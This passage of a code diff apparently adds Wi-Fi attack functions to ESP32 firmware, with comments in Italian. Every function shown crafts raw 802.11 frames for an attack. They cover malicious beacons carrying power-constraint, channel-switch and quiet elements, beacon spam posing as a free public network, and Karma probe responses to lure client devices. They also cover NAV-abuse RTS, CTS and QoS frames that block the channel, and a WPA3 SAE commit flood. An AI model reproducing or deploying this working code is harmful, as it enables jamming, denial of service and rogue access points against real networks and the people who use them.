+    packet[offset++] = 0;
+    packet[offset++] = strlen(ssid);
+    memcpy(&packet[offset], ssid, strlen(ssid));
+    offset += strlen(ssid);
+    // 2. Supported Rates
+    packet[offset++] = 1;
+    packet[offset++] = 4;
+    packet[offset++] = 0x82; packet[offset++] = 0x84; 
+    packet[offset++] = 0x8B; packet[offset++] = 0x96; 
+    // 3. DS Parameter (Channel)
+    packet[offset++] = 3;
+    packet[offset++] = 1;
+    packet[offset++] = channel;
+    // 4. Country Info (Necessario per TPC)
+    packet[offset++] = 7;
+    packet[offset++] = 6;
+    packet[offset++] = 'U'; packet[offset++] = 'S'; packet[offset++] = ' ';
+    packet[offset++] = 1; packet[offset++] = 11; packet[offset++] = 30; // Max 30 dBm
+    // 5. Power Constraint (TPC Attack)
+    packet[offset++] = 32;
+    packet[offset++] = 1;
+    packet[offset++] = 30; // Result: 0 dBm (30 - 30). Puoi provare 35.
+    // 6. TPC Report
+    packet[offset++] = 35;
+    packet[offset++] = 2;
+    packet[offset++] = 30; packet[offset++] = 0;
+
+    // --- NUOVI ATTACCHI AGGIUNTI ---
+    // 7. Channel Switch Announcement (CSA)
+    // Ordina al client di saltare su un canale diverso (es. 13) ORA (Count 0)
+    packet[offset++] = 37; // Tag Number
+    packet[offset++] = 3;  // Length
+    packet[offset++] = 1;  // Mode: 1 (Clienti smettono di trasmettere finché non switchano)
+    packet[offset++] = (channel == 13) ? 1 : 13; // Nuovo Canale (diverso dall'attuale)
+    packet[offset++] = 0;  // Count: 0 (Switch Immediato!)
+    // 8. Quiet Element
+    // Ordina silenzio radio per misurazioni radar
+    packet[offset++] = 40; // Tag Number
+    packet[offset++] = 6;  // Length
+    packet[offset++] = 1;  // Quiet Count (Tra 1 beacon inizia il silenzio)
+    packet[offset++] = 1;  // Quiet Period (Ogni beacon)
+    packet[offset++] = 0xFF; // Duration (Low Byte) - Max durata
+    packet[offset++] = 0xFF; // Duration (High Byte)
+    packet[offset++] = 0x00; // Offset (Subito)
+    packet[offset++] = 0x00;
+
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, packet, offset, false);
+    if (err != ESP_OK) {
+        wifi_dropped_frame_increment();
+    }
+    return err;
+}
+
+
+esp_err_t wifi_attack_softap_beacon_spam(const char *ssid, uint8_t channel)
+{
+    if(ssid == NULL) return ESP_ERR_INVALID_ARG;
+
+    static uint16_t seq_num = 0; // Variabile statica per incrementare la sequenza
+    uint8_t mac[6] = { 0 };
+    esp_wifi_get_mac(ESP_IF_WIFI_AP, mac);
+
+    uint8_t beacon_frame[256];
+    uint16_t offset = 0;
+
+    // --- MAC HEADER (24 Byte) ---
+    beacon_frame[offset++] = 0x80; beacon_frame[offset++] = 0x00; // Frame Control (Beacon)
+    beacon_frame[offset++] = 0x00; beacon_frame[offset++] = 0x00; // Duration
+    memset(&beacon_frame[offset], 0xFF, 6); offset += 6;          // Destination (Broadcast)
+    memcpy(&beacon_frame[offset], mac, 6);  offset += 6;          // Source
+    memcpy(&beacon_frame[offset], mac, 6);  offset += 6;          // BSSID
+    
+    // Sequence Control (Incrementale)
+    seq_num = (seq_num + 1) % 4096;
+    beacon_frame[offset++] = (seq_num << 4) & 0xFF; // Frag number 0
+    beacon_frame[offset++] = (seq_num >> 4) & 0xFF;
+
+    // --- FIXED PARAMETERS (12 Byte) ---
+    // Timestamp (8 Byte) - Microsecondi reali
+    uint64_t ts = esp_timer_get_time();
+    memcpy(&beacon_frame[offset], &ts, 8); 
+    offset += 8;
+
+    // Beacon Interval (2 Byte) - es. 100 TU (102.4ms)
+    beacon_frame[offset++] = 0x64; beacon_frame[offset++] = 0x00;
+
+    // Capability Info (2 Byte) - ESS + Short Preamble
+    beacon_frame[offset++] = 0x21; beacon_frame[offset++] = 0x00;
+
+    // --- TAGGED PARAMETERS ---
+    
+    // 1. SSID
+    beacon_frame[offset++] = 0x00; // Tag Number
+    beacon_frame[offset++] = strlen(ssid);
+    memcpy(&beacon_frame[offset], ssid, strlen(ssid));
+    offset += strlen(ssid);
+
+    // 2. Supported Rates
+    uint8_t rates[] = {0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24};
+    beacon_frame[offset++] = 0x01;
+    beacon_frame[offset++] = sizeof(rates);
+    memcpy(&beacon_frame[offset], rates, sizeof(rates));
+    offset += sizeof(rates);
+
+    // 3. DS Parameter (Channel)
+    beacon_frame[offset++] = 0x03;
+    beacon_frame[offset++] = 0x01;
+    beacon_frame[offset++] = channel;
+
+    // 4. TIM (Traffic Indication Map) - FONDAMENTALE per i client moderni
+    // Tag 5, Len 4, DTIM Count 0, DTIM Period 1, Bitmap Control 0, Bitmap 0
+    uint8_t tim[] = {0x00, 0x01, 0x00, 0x00}; 
+    beacon_frame[offset++] = 0x05; // Tag TIM
+    beacon_frame[offset++] = sizeof(tim);
+    memcpy(&beacon_frame[offset], tim, sizeof(tim));
+    offset += sizeof(tim);
+
+    // 5. ERP Information (Opzionale ma utile per 802.11g/n)
+    beacon_frame[offset++] = 0x2A;
+    beacon_frame[offset++] = 0x01;
+    beacon_frame[offset++] = 0x00;
+
+    // 6. Interworking (802.11u) - Suggerisce che è una rete pubblica gratuita
+    beacon_frame[offset++] = 0x6B; // Tag 107 (Interworking)
+    beacon_frame[offset++] = 0x05; // Length
+    beacon_frame[offset++] = 0x0F; // Access Network Type: Free public network (0x00) + Internet (0x0F)
+    // Venue Info (Unspecified)
+    beacon_frame[offset++] = 0x00; 
+    beacon_frame[offset++] = 0x00; 
+    beacon_frame[offset++] = 0x00; 
+    beacon_frame[offset++] = 0x00;
+
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame, offset, false);
+    if (err != ESP_OK) {
+        wifi_dropped_frame_increment();
+    }
+    return err;
+}
+
+
+esp_err_t wifi_attack_send_karma_probe_response(const uint8_t *victim_mac, const char *requested_ssid, uint8_t channel)
+{
+    uint8_t my_mac[6];
+    esp_wifi_get_mac(WIFI_IF_AP, my_mac);
+
+    struct libwifi_probe_resp probe_resp_logic = {0};
+    int ret_create = libwifi_create_probe_resp(&probe_resp_logic, victim_mac, my_mac, my_mac, requested_ssid, channel);
+
+    if (ret_create != 0) {
+        ESP_LOGE("KARMA", "Errore creazione struct probe response");
+        return ESP_FAIL;
+    }
+
+    uint8_t buffer[256];
+    size_t frame_len = libwifi_dump_probe_resp(&probe_resp_logic, buffer, sizeof(buffer));
+    if (frame_len == 0) {
+        ESP_LOGE("KARMA", "Errore dump probe response");
+        libwifi_free_probe_resp(&probe_resp_logic);
+        return ESP_FAIL;
+    }
+    
+    /* Spam */
+    esp_err_t err = ESP_OK;
+    for (uint8_t i = 0; i < 5; i++) 
+    {
+        err = esp_wifi_80211_tx(WIFI_IF_AP, buffer, frame_len, false);
+        if (err != ESP_OK) {
+            wifi_dropped_frame_increment();
+        }
+    }
+
+    libwifi_free_probe_resp(&probe_resp_logic);
+    return ESP_OK;
+}
+
+
+esp_err_t wifi_attack_nav_abuse_rts(const uint8_t bssid[6])
+{
+    if (bssid == NULL) return ESP_ERR_INVALID_ARG;
+
+    // Frame RTS (Request to Send) - Type Control (0x1), Subtype RTS (0xB) -> 0xB4
+    // Duration: 32767 microsecondi (0x7FFF) - Il massimo valore per bloccare il canale
+    uint8_t rts_packet[20] = {
+        0xB4, 0x00,                         // Frame Control (RTS)
+        0xFF, 0x7F,                         // Duration (High value ~32ms)
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver Address (Broadcast o Target)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Transmitter Address (Spoofed BSSID)
+        // No Sequence control in Control Frames usually, but ESP32 API handles padding
+    };
+
+    memcpy(&rts_packet[4], bssid, 6);   // Receiver: Target AP (lo costringiamo a leggere)
+    memcpy(&rts_packet[10], bssid, 6);  // Transmitter: Target AP (sembra che sia LUI a chiedere silenzio)
+
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, rts_packet, 16, false); 
+    if (err != ESP_OK) {
+        wifi_dropped_frame_increment();
+    }
+    return err;
+}
+
+
+esp_err_t wifi_attack_nav_abuse_cts(const uint8_t bssid[6])
+{
+    if (bssid == NULL) return ESP_ERR_INVALID_ARG;
+    // CTS Frame (10 bytes + FCS calcolato dal driver)
+    // Structure: FC (2) + Duration (2) + RA (6)
+    uint8_t cts_packet[10] = {
+        /* Frame Control: CTS (0xC4) */
+        0xC4, 0x00, 
+        /* Duration: MAX (32ms) */
+        0xFF, 0x7F, 
+        /* Receiver Address (RA) */
+        // Qui si mette il BSSID dell'AP o Broadcast ff:ff:ff:ff:ff:ff
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00 
+    };
+
+    memcpy(&cts_packet[4], bssid, 6); 
+
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, cts_packet, sizeof(cts_packet), false);
+    if (err != ESP_OK) {
+        wifi_dropped_frame_increment();
+    }
+    return err;
+}
+
+
+esp_err_t wifi_attack_nav_abuse_qos_null(const uint8_t target[6], const uint8_t bssid[6])
+{
+    if (target == NULL || bssid == NULL) return ESP_ERR_INVALID_ARG;
+
+    static uint16_t seq = 0;
+    // Frame QoS Null (Type: Data, Subtype: QoS Null)
+    // Should bypass hardware check because its a data frame not control frame
+    uint8_t qos_null_packet[26] = {
+        /* Frame Control: Type Data (0x02), Subtype QoS Null (0x0C) -> 0xC8 */
+        // Nota: 0xC8 = 1100 1000 (Subtype 12, Type 2, Version 0)
+        0xC8, 0x01, // ToDS=1 (fingiamo di inviare all'AP)
+        /* DURATION: attack payload*/
+        0xFF, 0x7F, // ~32ms (Max NAV)
+        /* Address 1: BSSID (Receiver - L'AP) */
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        /* Address 2: Source (Il Target o Random) */
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        /* Address 3: Destination (L'AP o Target) */
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        /* Sequence Control */
+        0x00, 0x00,
+        /* QoS Control (2 Bytes) - Necessario per frame QoS */
+        0x00, 0x00 
+    };
+
+    seq++;
+    qos_null_packet[22] = (seq & 0x0F);       // Fragment number (sempre 0)
+    qos_null_packet[23] = (seq >> 4) & 0xFF;
+
+    memcpy(&qos_null_packet[4], bssid, 6);   // A1: A chi lo mandiamo (AP)
+    memcpy(&qos_null_packet[10], target, 6); // A2: Chi siamo (Target vittima o Random)
+    memcpy(&qos_null_packet[16], bssid, 6);  // A3: BSSID
+
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, qos_null_packet, sizeof(qos_null_packet), false);
+    if (err != ESP_OK) {
+        wifi_dropped_frame_increment();
+    }
+    return err;
+}
+
+
+esp_err_t wifi_attack_nav_abuse_qos_data(const uint8_t target[6], const uint8_t bssid[6])
+{
+    if (target == NULL || bssid == NULL) return ESP_ERR_INVALID_ARG;
+
+    static uint16_t sequence_counter = 0; 
+    // Usiamo QoS DATA (0x88)
+    // 26 byte header + 1 byte payload = 27 byte
+    uint8_t qos_data_packet[27] = { 
+        /* Frame Control: QoS Data (0x88) */
+        0x88, 
+        0x01, // ToDS=1 (Verso l'AP)
+        /* DURATION: MAX NAV */
+        0xFF, 0x7F, // 32ms
+        /* Address 1: BSSID (AP) */
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        /* Address 2: Source (Target) */
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        /* Address 3: Destination (AP) */
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        /* Sequence Control (Placeholder, viene sovrascritto sotto) */
+        0x00, 0x00,
+        /* QoS Control */
+        0x00, 0x00, // Normal Ack Policy
+        /* PAYLOAD FINTO (1 Byte) */
+        0xAA // Junk
+    };
+
+    memcpy(&qos_data_packet[4], bssid, 6);   // A1: AP (Receiver)
+    memcpy(&qos_data_packet[10], target, 6); // A2: Target (Source/Transmitter)
+    memcpy(&qos_data_packet[16], bssid, 6);  // A3: AP (Destination)
+
+    sequence_counter++;
+    if (sequence_counter > 4095) sequence_counter = 0; // Max 12 bit (4095)
+
+    uint16_t seq_field = (sequence_counter << 4);
+
+    qos_data_packet[22] = seq_field & 0xFF;
+    qos_data_packet[23] = (seq_field >> 8) & 0xFF;
+
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, qos_data_packet, sizeof(qos_data_packet), false);
+    if (err != ESP_OK) {
+        wifi_dropped_frame_increment();
+    }
+    return err;
+}
+
+
+esp_err_t wifi_attack_nav_abuse_qos_data_broadcast(const uint8_t ap_bssid[6])
+{
+    if (ap_bssid == NULL) return ESP_ERR_INVALID_ARG;
+
+    static uint16_t seq_num = 0;
+    uint8_t packet[27] = {
+        // Frame Control: QoS Data (0x88) + FromDS (0x02) = 0x8A
+        0x88, 0x02, 
+        // DURATION: 32ms (IL PAYLOAD DELL'ATTACCO)
+        // L'hardware NON lo toccherà perché Address 1 è Broadcast!
+        0xFF, 0x7F, 
+        // Address 1: Receiver (BROADCAST) -> Target di tutti i client
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+        // Address 2: Transmitter (BSSID AP) -> Chi sta parlando
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        // Address 3: Source (BSSID AP) -> Origine dati
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        // Sequence Control (Gestito manualmente)
+        0x00, 0x00,
+        // QoS Control
+        0x00, 0x00,
+        // Dummy Payload (1 Byte)
+        0xAA 
+    };
+
+    memcpy(&packet[10], ap_bssid, 6); // A2
+    memcpy(&packet[16], ap_bssid, 6); // A3
+
+    seq_num++;
+    if (seq_num > 4095) seq_num = 0;
+    
+    uint16_t seq_field = (seq_num << 4);
+    packet[22] = seq_field & 0xFF;
+    packet[23] = (seq_field >> 8) & 0xFF;
+
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+    if (err != ESP_OK) {
+        wifi_dropped_frame_increment();
+    }
+    return err;
+}
+
+
+esp_err_t wifi_attack_wpa3_sae_flood(const uint8_t bssid[6])
+{
+    if (bssid == NULL) return ESP_ERR_INVALID_ARG;
+
+    // Buffer aumentato per contenere il payload completo
+    uint8_t sae_commit_packet[150]; 
+    
+    // Genera MAC Random (Src)
+    uint8_t rand_mac[6];
+    esp_fill_random(rand_mac, 6);
+    rand_mac[0] &= 0xFE; rand_mac[0] |= 0x02; // Unicast locale random
+
+    // 1. Header 802.11 Authentication (24 Byte)
+    uint8_t header[] = {
+        0xB0, 0x00,                         // FC: Auth
+        0x3A, 0x01,                         // Duration
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Dest (BSSID - sarà sovrascritto)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Random - sarà sovrascritto)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (sarà sovrascritto)
+        0x00, 0x00                          // Seq
+    };
+
+    // 2. Auth Body: SAE (Algo=3), Seq=1 (Commit), Status=0 (6 Byte)
+    uint8_t auth_body[] = {
+        0x03, 0x00, // Auth Algorithm: SAE (3)
+        0x01, 0x00, // Auth Sequence: 1 (Commit)
+        0x00, 0x00  // Status Code: Success
+    };
+
+    // 3. SAE Parameters
+    uint8_t group_id[] = {0x13, 0x00}; // Group 19 (NIST P-256) - Little Endian
+
+    // 4. SAE Data (Scalar + Element)
+    // Per P-256: Scalar (32B) + Element X (32B) + Element Y (32B) = 96 Byte
+    uint8_t sae_payload[96]; 
+    esp_fill_random(sae_payload, sizeof(sae_payload));
+
+    // --- Assemblaggio ---
+    int offset = 0;
+
+    // Copia Header e indirizzi
+    memcpy(sae_commit_packet, header, sizeof(header));
+    memcpy(&sae_commit_packet[4], bssid, 6);     // Dest
+    memcpy(&sae_commit_packet[10], rand_mac, 6); // Src
+    memcpy(&sae_commit_packet[16], bssid, 6);    // BSSID
+    offset += sizeof(header);
+
+    // Copia Auth Body
+    memcpy(&sae_commit_packet[offset], auth_body, sizeof(auth_body));
+    offset += sizeof(auth_body);
+
+    // Copia Group ID
+    memcpy(&sae_commit_packet[offset], group_id, 2);
+    offset += 2;
+
+    // Copia Payload Random (Scalar + Element)
+    memcpy(&sae_commit_packet[offset], sae_payload, sizeof(sae_payload));
+    offset += sizeof(sae_payload);
+
+    // Invio (Usa la tecnica burst/no-delay discussa prima per saturare)
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, sae_commit_packet, offset, false);
+    if (err != ESP_OK) {
+        wifi_dropped_frame_increment();
+    }
+    return err;
+}
